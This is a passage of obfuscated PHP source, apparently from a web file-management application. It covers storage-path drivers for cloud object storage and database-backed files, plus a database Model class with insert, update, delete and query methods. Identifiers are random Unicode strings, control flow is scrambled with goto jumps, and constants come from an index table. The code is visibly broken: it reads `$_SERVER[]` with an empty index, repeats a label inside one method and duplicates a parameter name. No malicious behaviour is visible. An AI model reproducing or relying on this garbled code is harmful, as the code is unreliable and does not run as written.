$this->field($Eэ[28])->where($d)->select(); $cΓ = array_to_keyvalue($F, $Eэ[33], $Eэ[28]); return $this->fileNameAutoGet($cΓ, $E, $c, $bɳ); } public function fileNameAutoGet($eؠ, $a, $Ež, $Cޝ) { $B֚ =& $_SERVER[]; if ($Ež == REPEAT_REPLACE || !$eؠ || !in_array_not_case($a, $eؠ) || $Cޝ && $Ež != REPEAT_RENAME_FOLDER) { return $a; } if ($Ež == REPEAT_SKIP) { return !1; } $A = $B֚[95] . get_path_ext($a); $A = $A == $B֚[95] || $Cޝ ? $B֚[33] : $A; for ($fڷ熛 = 1; $fڷ熛 <= count($eؠ) + 1; $fڷ熛++) { $E = substr($a, 0, strlen($a) - strlen($A)); $f̏ = $E . "\50{$fڷ熛}\x29{$A}"; if (!in_array_not_case($f̏, $eؠ)) { return $f̏; } } } } goto E; E: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($EƏ) { parent::__construct($EƏ); $this->signatureVersion($_SERVER[][212]); } public function uploadFormData($B񾥺, $Eք㉞ = 3600) { goto E䄄; E䄄: $aӇ =& $_SERVER[]; $c܏֎ = $aӇ[192]; $a = $aӇ[230]; goto EÂ; fէ: $Bư⤻ = array($aӇ[1198] => $cﴩ, $aӇ[1199] => array(array($aӇ[1200] => $c܏֎), array($aӇ[1201] => $this->bucket), array($aӇ[1202], $aӇ[1203], $aӇ[33]), array($aӇ[1204] => $A), array($aӇ[1205] => $a), array($aӇ[1206] => $this->accessKey), array($aӇ[1207] => $Fڋ))); $Bư⤻ = json_encode($Bư⤻); $fڶ = hash_hmac($aӇ[230], $Fڋ, $this->secret); goto bܠ; bܠ: $e = sha1($Bư⤻); $c𦷵 = hash_hmac($aӇ[230], $e, $fڶ); $cϗ = array($aӇ[1200] => $c܏֎, $aӇ[1204] => $A, $aӇ[1208] => base64_encode($Bư⤻), $aӇ[1205] => $a, $aӇ[1206] => $this->accessKey, $aӇ[1209] => $Fڋ, $aӇ[1210] => $c𦷵, $aӇ[175] => $this->getHost()); goto Aֆ˚; Aֆ˚: return $cϗ; goto FƐ; EÂ: $A = $aӇ[1196]; $cﴩ = gmdate($aӇ[1197], time() + $Eք㉞); $Fڋ = (string) time() . $aӇ[68] . (string) (time() + $Eք㉞); goto fէ; FƐ: } public function fileOutLink($bإ) { $f褭½ =& $_SERVER[]; if (substr($bإ, 0, 7) == $f褭½[1211]) { $bإ = $f褭½[1212] . substr($bإ, 7); } header($f褭½[159] . $bإ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($e˥) { $this->pathParse = $e˥; $this->model = Model($_SERVER[][1213]); } public function getPath($dִ) { return trim($dִ, $_SERVER[][8]); } public function pathFather($eƮү) { $f䔘ꖷ = $this->parse($eƮү); $f䔘ꖷ = $this->infoSimple($eƮү); return $f䔘ꖷ ? $f䔘ꖷ[$_SERVER[][478]] : !1; } public function pathThis($B¨ߕг) { $C̒ = $this->infoSimple($B¨ߕг); return $C̒ ? $C̒[$_SERVER[][28]] : !1; } public function getPathOuter($Eܳό) { if (!$Eܳό) { return $Eܳό; } $dЊ = $this->parse($Eܳό); return KodIO::make($dЊ[$_SERVER[][393]]); } public function copyFolderFromIO($Fۻ, $E쥉, $BĔ, $b, $EԊ) { $E = $this->model->copyFolderFromIO($Fۻ, $E쥉, $BĔ, $b, $EԊ); return KodIO::make($E); } public function isParentOf($a, $FΥ) { return $this->model->isParentOf($a, $FΥ); } public function mkfile($A㵌, $Fý⧡ = '', $D = REPEAT_RENAME) { $fؾ =& $_SERVER[]; $e񇤇Ճ = $this->parse($A㵌); $A㵌 = $e񇤇Ճ[$fؾ[393]]; for ($Cԕډ = 0; $Cԕډ < count($e񇤇Ճ[$fؾ[1214]]); $Cԕډ++) { $Bݐ = $e񇤇Ճ[$fؾ[1214]][$Cԕډ]; if ($Cԕډ == count($e񇤇Ճ[$fؾ[1214]]) - 1) { $A㵌 = $this->model->mkfile($A㵌, $Bݐ, $Fý⧡, $D); break; } $A㵌 = $this->model->mkdir($A㵌, $Bݐ, REPEAT_SKIP); } return $this->getPathOuter($A㵌); } public function mkdir($dږ, $fқ = REPEAT_SKIP) { $d戞ς =& $_SERVER[]; $A = $this->parse($dږ); $dږ = $A[$d戞ς[393]]; for ($A = 0; $A < count($A[$d戞ς[1214]]); $A++) { $aޖ = $A[$d戞ς[1214]][$A]; $dږ = $this->model->mkdir($dږ, $aޖ, $fқ); } return $this->getPathOuter($dږ); } public function copyFile($b罯, $A㏆, $CٞƮ = REPEAT_REPLACE) { $bº =& $_SERVER[]; $e = $this->parse($A㏆); $aŴ = $this->model->copy($b罯, $e[$bº[393]], $CٞƮ, $e[$bº[76]]); return $aŴ ? $this->getPathOuter($aŴ) : !1; } public function moveFile($a, $Cѳ, $dʊ = REPEAT_REPLACE) { $f =& $_SERVER[]; $b = $this->parse($Cѳ); $Dؐ = $this->model->move($a, $b[$f[393]], $dʊ, $b[$f[76]]); return $Dؐ ? $this->getPathOuter($Dؐ) : !1; } public function copy($A闩Ҹ, $a̻ԕ, $bÇӌ = REPEAT_REPLACE) { $CᏐ = $this->parse($a̻ԕ); $eАɮ = $this->model->copy($A闩Ҹ, $CᏐ[$_SERVER[][393]], $bÇӌ); return $eАɮ ? $this->getPathOuter($eАɮ) : !1; } public function moveSameAllow() { } public function move($DՖ׸, $D؃, $e = REPEAT_REPLACE) { $f཰ = $this->parse($D؃); $dχ㌮ = $this->model->move($DՖ׸, $f཰[$_SERVER[][393]], $e); return $dχ㌮ ? $this->getPathOuter($dχ㌮) : !1; } public function remove($c, $eȃ = true) { return $this->model->remove($c, $eȃ); } public function rename($bą, $Aݶ) { $eş = $this->model->rename($bą, $Aݶ); return $eş ? $this->getPathOuter($bą) : $eş; } public function size($bŲ޺) { $a = $this->infoSimple($bŲ޺); return $a ? $a[$_SERVER[][78]] : 0; } public function infoSimple($e砻) { return $this->model->sourceInfo($e砻); } public function info($BΠ) { return $this->infoParse($BΠ); } public function infoAuth($bǙԧ) { return $this->infoParse($bǙԧ, !1, !0); } public function infoWithChildren($a) { return $this->infoParse($a, !0); } protected function infoParse($BȦ, $C韼 = false, $B¢ϸ = false) { if (!$C韼) { return $this->model->pathInfo($BȦ, $B¢ϸ); } return $this->model->pathInfoMore($BȦ); } public function infoFull($C䎟) { $C誷ɴ =& $_SERVER[]; $D񾅋 = explode($C誷ɴ[8], $C䎟); $B뚿 = implode($C誷ɴ[8], array_splice($D񾅋, 1)); return $this->model->pathInfoByPath($D񾅋[0], $B뚿); } public function hashSimple($Aϼ) { $e݌ =& $_SERVER[]; $d = $this->infoWithChildren($Aϼ); return $d[$e݌[164]][$e݌[171]]; } public function hashMd5($cޔѬ) { $b =& $_SERVER[]; $Aʙ = $this->infoWithChildren($cޔѬ); return $Aʙ[$b[164]][$b[170]]; } public function exist($f) { $A̙ =& $_SERVER[]; $cϰ = $this->parse($f); if (!$cϰ[$A̙[76]]) { return $this->isFile($f) || $this->isFolder($f); } $DԴ = array($A̙[394] => $cϰ[$A̙[393]], $A̙[28] => $cϰ[$A̙[76]]); $d = $this->model->where($DԴ)->find(); return $d ? !0 : !1; } public function isFile($fŖƱ֖) { $Dӕϋ =& $_SERVER[]; $Aț = $this->infoSimple($fŖƱ֖); return $Aț && $Aț[$Dӕϋ[403]] == $Dӕϋ[87] ? !1 : !0; } public function isFolder($A󏻹) { $fق޽ =& $_SERVER[]; $BҰ = $this->infoSimple($A󏻹); return $BҰ && $BҰ[$fق޽[403]] == $fق޽[87] ? !0 : !1; } public function listPath($a臇Ѓ, $AЂ = false) { $cۅȜ =& $_SERVER[]; if ($a臇Ѓ == $cۅȜ[33]) { return !1; } $dկ = array($cۅȜ[394] => $a臇Ѓ); if ($AЂ) { return $this->model->listSource($dկ, -1); } return $this->model->listSource($dկ); } public function has($D, $F = false, $B = null) { $B󏈪 =& $_SERVER[]; $f = $this->infoWithChildren($D); if ($F) { return array($B󏈪[204] => $f[$B󏈪[204]], $B󏈪[203] => $f[$B󏈪[203]]); } return $B ? $f[$B󏈪[204]] : $f[$B󏈪[203]]; } public function listAll($F) { $cȬ = IO::info($this->pathParse[$_SERVER[][76]]); if (!$cȬ) { return array(); } return $this->model->listAll($F); } public function getContent($BЬ𚭊) { return $this->model->getContent($BЬ𚭊); } public function setContent($Aӛ, $aΧϱȞ = '') { return $this->model->setContent($Aӛ, $aΧϱȞ); } public function fileSubstr($Fֿ, $e, $bϘ) { return $this->model->fileSubstr($Fֿ, $e, $bϘ); } public function download($C땃, $E֟ = '') { $f = get_path_father($E֟); $fʤ = get_path_this($E֟); $c = $this->model->fileInfoGet($C땃); $C = IO::copy($c[$_SERVER[][76]], $f, !1, $fʤ); return $C; } public function setModifyTime($Aڟµ, $eʊ = '') { $f޻ =& $_SERVER[]; if (!$Aڟµ) { return; } $this->model->where(array($f޻[410] => $Aڟµ))->save(array($f޻[84] => $eʊ)); } public function upload($AА, $fґދ, $Eޗ = false, $D° = REPEAT_REPLACE) { $Fů =& $_SERVER[]; $d = $this->parse($AА); $F = $this->model->addFile($d[$Fů[393]], $fґދ, $d[$Fů[76]], $Eޗ, $D°); return $this->getPathOuter($F); } public function uploadFileByID($fꗿ, $bɜ݆, $d) { $eߋ =& $_SERVER[]; $cĒ = $this->parse($fꗿ); $D񗫿 = $this->model->addFileByFileID($cĒ[$eߋ[393]], $bɜ݆, $cĒ[$eߋ[76]], $d); return $this->getPathOuter($D񗫿); } public function addFileByRemote($dٚ, $cŇ, $C = array(), $d࿄ = '', $f톪) { $E؋ =& $_SERVER[]; $b񴄄 = $this->parse($dٚ); $d࿄ = empty($d࿄) ? $b񴄄[$E؋[76]] : $d࿄; $fϱ = $this->model->addFileByRemote($b񴄄[$E؋[393]], $cŇ, $d࿄, $C, $f톪); return $this->getPathOuter($fϱ); } public function uploadLink($D, $f߄ = 0) { $eѽ =& $_SERVER[]; $a = $this->parse($D); $fǑ = _get($GLOBALS[$eѽ[7]], $eѽ[1215]); $E = _get($GLOBALS[$eѽ[7]], $eѽ[1216]); $D = Model($eѽ[571])->createFileName($a[$eѽ[76]], $fǑ, $E); return IO::uploadLink($D, $f߄); } public function fileNameAuto($B, $A, $C = REPEAT_REPLACE, $dݷȆ = false) { return $this->model->fileNameAuto($B, $A, $C, $dݷȆ); } public function fileNameExist($b߸ӎ, $f) { return $this->model->fileNameExist($b߸ӎ, $f); } protected function _fileOut($FӱŘ, $Dڼ = false, $eǋ = false, $Bך = '', $C = false) { goto dɘ; dɘ: $aؕ =& $_SERVER[]; $E؊ = $this->model->sourceInfo($FӱŘ); if ($E؊[$aؕ[403]] == $aؕ[87]) { header($aؕ[1217]); die; } goto Dگ; AՌ: if ($C) { return IO::fileOutServer($f�[$aؕ[76]], $Dڼ, $f, $Bך); } IO::fileOut($f�[$aؕ[76]], $Dڼ, $f, $Bך); goto C; Dگ: $f� = $this->model->fileInfoGet($FӱŘ); $Bך = $f�[$aؕ[170]] ? $f�[$aؕ[170]] : $Bך; $f = isset($GLOBALS[$aؕ[1218]]) ? $GLOBALS[$aؕ[1218]] : $E؊[$aؕ[28]]; goto AՌ; C: } public function fileOut($e, $D = false, $D = false, $f = '') { $this->_fileOut($e, $D, $D, $f); } public function fileOutServer($BƩ, $DՊ = false, $D䵑 = false, $Eה = '') { $this->_fileOut($BƩ, $DՊ, $D䵑, $Eה, !0); } protected function _fileOutImage($B᜕, $b˲ = 250) { goto a; a˷: $c칃я = $this->model->fileInfoGet($B᜕); $c칃я[$D넛ƽ[28]] = $Cَ[$D넛ƽ[28]]; $c칃я[$D넛ƽ[163]] = $Cَ[$D넛ƽ[163]]; goto eЦ; a: $D넛ƽ =& $_SERVER[]; $Cَ = $this->model->pathInfo($B᜕); if ($Cَ[$D넛ƽ[403]] == $D넛ƽ[87]) { show_json($D넛ƽ[1219] . $B᜕, !1); } goto a˷; eЦ: $GLOBALS[$D넛ƽ[1218]] = $c칃я[$D넛ƽ[28]]; $GLOBALS[$D넛ƽ[162]] = $c칃я; IO::fileOutImage($c칃я[$D넛ƽ[76]], $b˲); goto dĥ; dĥ: } public function fileOutImage($cΎ, $B󊤪Ƣ = 250) { $this->_fileOutImage($cΎ, $B󊤪Ƣ); } public function fileOutImageServer($B֟, $dň׫ = 250) { $this->_fileOutImage($B֟, $dň׫); } public function link($B, $C = '') { $Bƣ = $this->model->fileInfoGet($B); return IO::link($Bƣ[$_SERVER[][76]], $C); } protected function parse($b) { $AꝤû =& $_SERVER[]; if (strstr($b, $AꝤû[8]) === !1) { return array($AꝤû[412] => intval($b), $AꝤû[76] => $AꝤû[33], $AꝤû[1214] => array()); } $e = explode($AꝤû[8], trim($b, $AꝤû[8])); if (count($e) < 2) { show_tips($b . $AꝤû[1220]); } return array($AꝤû[412] => intval($e[0]), $AꝤû[76] => $e[1], $AꝤû[1214] => array_slice($e, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($aݛ) { $this->pathParse = $aݛ; $this->model = Model($_SERVER[][1213]); } public function getPathOuter($c¶ے) { $Aᢕ =& $_SERVER[]; if (!$c¶ے) { return $c¶ے; } $bז = $this->parse($c¶ے); return trim(KodIO::makeShare($this->pathParse[$Aᢕ[393]], $bז[$Aᢕ[393]]), $Aᢕ[8]); } protected function infoParse($C, $Aϛ = false, $Eʼ = false) { $bǼ =& $_SERVER[]; $Bɑ = $this->pathParse[$bǼ[393]]; $f뢺 = trim($this->pathParse[$bǼ[1071]], $bǼ[8]); return Action($bǼ[1221])->sharePathInfo($Bɑ, $f뢺); } public function infoFull($dą) { $B̞Ӳ =& $_SERVER[]; $a͕ = explode($B̞Ӳ[8], trim($dą, $B̞Ӳ[8])); if (count($a͕) > 1) { $Eʉ = implode($B̞Ӳ[8], array_splice($a͕, 1)); $A = $this->model->pathInfoByPath($a͕[0], $Eʉ); if (!$A) { return !1; } $this->pathParse[$B̞Ӳ[1071]] = $A[$B̞Ӳ[395]]; } return $this->infoParse($dą); } public function listAll($Bሿ켆) { goto F; F: $Eׯ =& $_SERVER[]; $F׮ = IO::info($this->pathParse[$Eׯ[76]]); if (!$F׮) { return array(); } goto d; d: $D㫢 = $this->model->listAll($Bሿ켆); $f殸 = Model($Eׯ[563])->getInfo($F׮[$Eׯ[468]]); $F = Action($Eׯ[1221]); goto eʧ΄; eʧ΄: foreach ($D㫢 as &$e㲚) { check_abort(); $e㲚[$Eׯ[85]] = $F->_shareItemeParse($e㲚[$Eׯ[85]], $f殸); } unset($e㲚); return $D㫢; goto Fߪ; Fߪ: } } goto Cƨ; Dۜһ: define($_SERVER[][240], 0); define($_SERVER[][241], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\145", "\x6f\x72\144\145\162", "\x61\154\x69\141\163", "\x68\x61\166\151\x6e\x67", "\147\x72\x6f\x75\160", "\154\x6f\143\153", "\144\151\163\164\x69\x6e\143\164", "\x61\x75\x74\x6f", "\146\151\154\x74\145\162", "\166\141\154\151\x64\141\x74\x65", "\162\145\163\165\154\164", "\x62\151\x6e\144", "\x74\x6f\153\145\156"); public function __construct($Cך = '', $d܆ = '', $Eǋ = '') { $F =& $_SERVER[]; $this->_initialize(); if (!empty($Cך)) { if (strpos($Cך, $F[95])) { list($this->dbName, $this->name) = explode($F[95], $Cך); } else { $this->name = $Cך; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($d܆)) { $this->tablePrefix = $F[33]; } elseif ($F[33] != $d܆) { $this->tablePrefix = $d܆; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($F[242]); } $this->db(0, empty($this->connection) ? $Eǋ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $d =& $_SERVER[]; if (empty($this->fields)) { if (think_config($d[243])) { $d̍嫴 = $this->dbName ? $this->dbName : think_config($d[244]); $dܼ = think_var_cache($d[245] . strtolower(get_path_this($d̍嫴) . $d[95] . $this->name)); if ($dܼ) { $d񙨾 = think_config($d[246]); if (empty($d񙨾) || $dܼ[$d[247]] == $d񙨾) { $this->fields = $dܼ; return; } } } $this->flush(); } } public function flush() { goto a꟎; f: foreach ($Eމ as $f => $cᔚ) { $c㗨[$f] = $cᔚ[$d[29]]; if ($cᔚ[$d[36]]) { $this->fields[$d[249]] = $f; if ($cᔚ[$d[39]]) { $this->fields[$d[248]] = !0; } } } $this->fields[$d[250]] = $c㗨; if (think_config($d[246])) { $this->fields[$d[247]] = think_config($d[246]); } goto b; b: if (think_config($d[243])) { $bڦ = $this->dbName ? $this->dbName : think_config($d[244]); think_var_cache($d[245] . strtolower(get_path_this($bڦ) . $d[95] . $this->name), $this->fields); } goto c߲; a꟎: $d =& $_SERVER[]; $this->db->setModel($this->name); $Eމ = $this->db->getFields($this->getTableName()); goto C; C: if (!$Eމ) { return !1; } $this->fields = array_keys($Eމ); $this->fields[$d[248]] = !1; goto f; c߲: } public function switchModel($a̤, $a = array()) { $f =& $_SERVER[]; $aڶ = ucwords(strtolower($a̤)) . $f[251]; if (!class_exists($aڶ)) { think_exception($aڶ . think_lang($f[252])); } $this->_extModel = new $aڶ($this->name); if (!empty($a)) { foreach ($a as $F) { $this->_extModel->setProperty($F, $this->{$F}); } } return $this->_extModel; } public function __set($c, $fղ) { $this->data[$c] = $fղ; } public function __get($f߈) { return isset($this->data[$f߈]) ? $this->data[$f߈] : null; } public function __isset($a勠) { return isset($this->data[$a勠]); } public function __unset($C) { unset($this->data[$C]); } public function __call($B, $Dڂ) { $AƸ =& $_SERVER[]; if (in_array(strtolower($B), $this->methods, !0)) { $this->options[strtolower($B)] = $Dڂ[0]; return $this; } elseif (in_array(strtolower($B), array($AƸ[253], $AƸ[254], $AƸ[255], $AƸ[256], $AƸ[257]), !0)) { $B֘螦 = isset($Dڂ[0]) ? $Dڂ[0] : $AƸ[182]; $B֘螦 = $this->db->parseKey($B֘螦); return $this->getField(strtoupper($B) . $AƸ[258] . $B֘螦 . $AƸ[259] . $B, $AƸ[253]); } elseif (strtolower(substr($B, 0, 5)) == $AƸ[260]) { $B֘螦 = think_parse_name(substr($B, 5)); $Fԟ[$B֘螦] = $Dڂ[0]; return $this->where($Fԟ)->find(); } elseif (strtolower(substr($B, 0, 10)) == $AƸ[261]) { $B = think_parse_name(substr($B, 10)); $Fԟ[$B] = $Dڂ[0]; return $this->where($Fԟ)->getField($Dڂ[1]); } elseif (isset($this->_scope[$B])) { return $this->scope($B, $Dڂ[0]); } elseif (method_exists($this, $B)) { array_unshift($Dڂ, $B); return call_user_func_array(array($this, $AƸ[262]), $Dڂ); } else { return call_user_func_array(array(parent, $B), $Dڂ); } } protected function call() { goto cԺ; cԺ: $dˇ =& $_SERVER[]; $aΕ = func_get_args(); $FÎҚ = array_shift($aΕ); goto DǇ; B짊: if (isset($aΕ[$d]) && $aΕ[$d] === $FÎҚ) { think_exception(__CLASS__ . $dˇ[4] . $FÎҚ . think_lang($dˇ[263])); return; } $aΕ[] = $FÎҚ; if (method_exists($this, $dˇ[264])) { $f̸뿽 = call_user_func_array(array($this, $dˇ[265]), array($E͕, $aΕ)); if (!is_null($f̸뿽) && $f̸뿽 !== !1) { return $f̸뿽; } } goto b󒏍; DǇ: $E͕ = $FÎҚ; if (is_array($FÎҚ)) { $E͕ = $FÎҚ[1]; $FÎҚ = $FÎҚ[0]; } $d = count($aΕ) - 1; goto B짊; b󒏍: $E򉋤 = call_user_func_array(array($this, $FÎҚ), $aΕ); if (method_exists($this, $dˇ[266])) { $f̸뿽 = call_user_func_array(array($this, $dˇ[267]), array($E͕, $aΕ, $E򉋤)); if ($f̸뿽) { return $f̸뿽; } } return $E򉋤; goto b; b: } protected function _initialize() { } protected function _facade($Fߙʐ) { $DӸٱ =& $_SERVER[]; if (!empty($this->fields)) { foreach ($Fߙʐ as $cԕ => $Bźɝ) { if (is_array($this->fields) && !in_array($cԕ, $this->fields, !0)) { unset($Fߙʐ[$cԕ]); } elseif (is_scalar($Bźɝ)) { $this->_parseType($Fߙʐ, $cԕ); } } } if (!empty($this->options[$DӸٱ[268]])) { $Fߙʐ = array_map($this->options[$DӸٱ[268]], $Fߙʐ); unset($this->options[$DӸٱ[268]]); } $this->_beforeWrite($Fߙʐ); return $Fߙʐ; } protected function _beforeWrite(&$cݭ) { } public function add($Eɼ = '', $b㊷ = array(), $F = false) { goto a; a: if (empty($Eɼ)) { if (!empty($this->data)) { $Eɼ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[][269]); return !1; } } $b㊷ = $this->_parseOptions($b㊷); $Eɼ = $this->_facade($Eɼ); goto a; CȺ: return $c͇緸; goto d; a: if (!1 === $this->_beforeInsert($Eɼ, $b㊷)) { return !1; } $c͇緸 = $this->db->insert($Eɼ, $b㊷, $F); if (!1 !== $c͇緸) { $DͰ = $this->getLastInsID(); if ($DͰ) { $Eɼ[$this->getPk()] = $DͰ; $this->_after_insert($Eɼ, $b㊷); return $DͰ; } $this->_after_insert($Eɼ, $b㊷); } goto CȺ; d: } protected function _beforeInsert(&$F, $b񇉶) { } protected function _after_insert($F򦯹, $d) { } public function addAll($bƓ, $E賖 = array(), $Dê = false) { goto B; a: foreach ($bƓ as $f => $AŴ) { $bƓ[$f] = $this->_facade($AŴ); } if (method_exists($this->db, $aɚ[270])) { $CÜ = $this->db->insertAll($bƓ, $E賖, $Dê); } else { $this->startTrans(); foreach ($bƓ as $f => $AŴ) { $CÜ = $this->db->insert($AŴ, $E賖, $Dê); } $this->commit(); } if (!1 !== $CÜ) { $f㰴 = $this->getLastInsID(); if ($f㰴) { return $f㰴; } } goto eڸ; eڸ: return $CÜ; goto C̵; B: $aɚ =& $_SERVER[]; if (empty($bƓ)) { $this->error = think_lang($aɚ[269]); return !1; } $E賖 = $this->_parseOptions($E賖); goto a; C̵: } public function selectAdd($c = '', $e = '', $C̉­ = array()) { $dԿ =& $_SERVER[]; $C̉­ = $this->_parseOptions($C̉­); if (!1 === ($F🉽 = $this->db->selectInsert($c ? $c : $C̉­[$dԿ[271]], $e ? $e : $this->getTableName(), $C̉­))) { $this->error = think_lang($dԿ[272]); return !1; } else { return $F🉽; } } public function save($e = '', $Fؗȴ = array()) { goto d; d: $a޲ =& $_SERVER[]; if (empty($e)) { if (!empty($this->data)) { $e = $this->data; $this->data = array(); } else { $this->error = think_lang($a޲[269]); return !1; } } $e = $this->_facade($e); goto Eͺ; f砰Ԫ: if (!1 !== $d) { if (isset($d҃)) { $e[$a꺵] = $d҃; } $this->_afterUpdate($e, $Fؗȴ); } return $d; goto A֡; Eͺ: $Fؗȴ = $this->_parseOptions($Fؗȴ); $a꺵 = $this->getPk(); if (!isset($Fؗȴ[$a޲[273]])) { if (isset($e[$a꺵])) { $c[$a꺵] = $e[$a꺵]; $Fؗȴ[$a޲[273]] = $c; unset($e[$a꺵]); } else { $this->error = think_lang($a޲[272]); return !1; } } goto eƇ; eƇ: if (is_array($Fؗȴ[$a޲[273]]) && isset($Fؗȴ[$a޲[273]][$a꺵])) { $d҃ = $Fؗȴ[$a޲[273]][$a꺵]; } if (!1 === $this->_beforeUpdate($e, $Fؗȴ)) { return !1; } $d = $this->db->update($e, $Fؗȴ); goto f砰Ԫ; A֡: } protected function _beforeUpdate(&$aҘ, $cǦ) { } protected function _afterUpdate($D, $b) { } public function delete($fާ = array()) { goto d; fˌ: $e = $this->db->delete($fާ); if (!1 !== $e) { $d = array(); if (isset($e)) { $d[$a] = $e; } $this->_after_delete($d, $fާ); } return $e; goto B; BӘᨄ: if (is_numeric($fާ) || is_string($fާ)) { if (strpos($fާ, $e[47])) { $c脃[$a] = array($e[274], $fާ); } else { $c脃[$a] = $fާ; } $this->options[$e[273]] = $c脃; } $fާ = $this->_parseOptions(); if (is_array($fާ[$e[273]]) && isset($fާ[$e[273]][$a])) { $e = $fާ[$e[273]][$a]; } goto fˌ; d: $e =& $_SERVER[]; if (empty($fާ) && empty($this->options[$e[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $a = $this->getPk(); goto BӘᨄ; B: } protected function _after_delete($C, $d) { } public function select($d = array()) { goto D뮩; A꺽: $E = $this->db->select($d); if (!1 === $E) { return !1; } if (empty($E)) { return null; } goto bŇ݋; bŇ݋: $this->_afterSelect($E, $d); return $E; goto e񉈚; D뮩: $b =& $_SERVER[]; if (is_string($d) || is_numeric($d)) { $D֤ = $this->getPk(); if (strpos($d, $b[47])) { $bؿּ[$D֤] = array($b[274], $d); } else { $bؿּ[$D֤] = $d; } $this->options[$b[273]] = $bؿּ; } elseif (!1 === $d) { $d = $this->_parseOptions(); return $b[275] . $this->db->buildSelectSql($d) . $b[276]; } $d = $this->_parseOptions(); goto A꺽; e񉈚: } protected function _afterSelect(&$eӦ, $B̄) { } public function buildSql($d = array()) { $AҎ =& $_SERVER[]; $d = $this->_parseOptions($d); return $AҎ[275] . $this->db->buildSelectSql($d) . $AҎ[276]; } public function optionsValue($B֮ԡ = null) { if (is_null($B֮ԡ)) { return $this->options; } elseif (is_array($B֮ԡ)) { $this->options = array_merge($this->options, $B֮ԡ); } } protected function _parseOptions($c = array()) { goto b෧; EǺ: if (isset($c[$Eݸ[273]]) && is_array($c[$Eݸ[273]]) && !empty($e) && !isset($c[$Eݸ[280]]) && !isset($c[$Eݸ[277]])) { foreach ($c[$Eݸ[273]] as $AϿ => $e) { $AϿ = trim($AϿ); if (in_array($AϿ, $e, !0)) { if (is_scalar($e)) { $this->_parseType($c[$Eݸ[273]], $AϿ); } } elseif (!is_numeric($AϿ) && $Eݸ[71] != substr($AϿ, 0, 1) && !1 === strpos($AϿ, $Eݸ[95]) && !1 === strpos($AϿ, $Eݸ[258]) && !1 === strpos($AϿ, $Eݸ[281]) && !1 === strpos($AϿ, $Eݸ[282])) { unset($c[$Eݸ[273]][$AϿ]); } } } $this->_options_filter($c); return $c; goto fť; FЇ᭹: if (!isset($c[$Eݸ[277]])) { $c[$Eݸ[277]] = $this->getTableName(); $e = $this->fields; } else { $e = $this->getDbFields(); } if (!empty($c[$Eݸ[278]])) { $c[$Eݸ[277]] .= $Eݸ[50] . $c[$Eݸ[278]]; } $c[$Eݸ[279]] = $this->name; goto EǺ; b෧: $Eݸ =& $_SERVER[]; if (is_array($c)) { $c = array_merge($this->options, $c); } $this->options = array(); goto FЇ᭹; fť: } protected function _options_filter(&$Aڎ䫶) { } protected function _parseType(&$A, $EΠ) { $Cߝ =& $_SERVER[]; if (empty($this->options[$Cߝ[283]][$Cߝ[4] . $EΠ])) { $dޑ = strtolower($this->fields[$Cߝ[250]][$EΠ]); if (!1 !== strpos($dޑ, $Cߝ[284])) { } elseif (!1 === strpos($dޑ, $Cߝ[285]) && !1 !== strpos($dޑ, $Cߝ[286])) { $A[$EΠ] = intval($A[$EΠ]); } elseif (!1 !== strpos($dޑ, $Cߝ[287]) || !1 !== strpos($dޑ, $Cߝ[288])) { $A[$EΠ] = floatval($A[$EΠ]); } elseif (!1 !== strpos($dޑ, $Cߝ[289])) { $A[$EΠ] = (bool) $A[$EΠ]; } } } public function find($BŃ = array()) { goto BĞ; BĞ: $D׮ڶ =& $_SERVER[]; if (is_numeric($BŃ) || is_string($BŃ)) { $c[$this->getPk()] = intval($BŃ); $this->options[$D׮ڶ[273]] = $c; } $this->options[$D׮ڶ[290]] = 1; goto C񠶅; Bʬ: if (empty($D)) { return null; } $this->data = $D[0]; $this->_afterFind($this->data, $BŃ); goto fͭ; fͭ: if (!empty($this->options[$D׮ڶ[291]])) { return $this->returnResult($this->data, $this->options[$D׮ڶ[291]]); } return $this->data; goto F݃; C񠶅: $BŃ = $this->_parseOptions(); $D = $this->db->select($BŃ); if (!1 === $D) { return !1; } goto Bʬ; F݃: } protected function _afterFind(&$B𰑬, $C) { } protected function returnResult($e򃗾, $bڊͳ = '') { $Bس =& $_SERVER[]; if ($bڊͳ) { if (is_callable($bڊͳ)) { return call_user_func($bڊͳ, $e򃗾); } switch (strtolower($bڊͳ)) { case $Bس[292]: return json_encode($e򃗾); case $Bس[293]: return xml_encode($e򃗾); } } return $e򃗾; } public function parseFieldsMap($F뺍, $E = 1) { if (!empty($this->_map)) { foreach ($this->_map as $dŇ => $B) { if ($E == 1) { if (isset($F뺍[$B])) { $F뺍[$dŇ] = $F뺍[$B]; unset($F뺍[$B]); } } else { if (isset($F뺍[$dŇ])) { $F뺍[$B] = $F뺍[$dŇ]; unset($F뺍[$dŇ]); } } } } return $F뺍; } public function setField($b򚄈, $D = '') { if (is_array($b򚄈)) { $F = $b򚄈; } else { $F[$b򚄈] = $D; } return $this->save($F); } public function setAdd($Aв, $AŸʈ = 1) { $bѣ׌ =& $_SERVER[]; $E = $Aв . $bѣ׌[294] . $AŸʈ; if ($AŸʈ < 0) { $E = $Aв . $AŸʈ; } return $this->setField($Aв, array($bѣ׌[295], $E)); } public function getField($eҬω, $fǪօ = null) { $c̞ϊ =& $_SERVER[]; $c΅[$c̞ϊ[271]] = $eҬω; $c΅ = $this->_parseOptions($c΅); $eҬω = trim($eҬω); if (strpos($eҬω, $c̞ϊ[47])) { if (!isset($c΅[$c̞ϊ[290]])) { $c΅[$c̞ϊ[290]] = is_numeric($fǪօ) ? $fǪօ : $c̞ϊ[33]; } $bЉ = $this->db->select($c΅); if (!empty($bЉ)) { goto F; Bݎϑ: foreach ($bЉ as 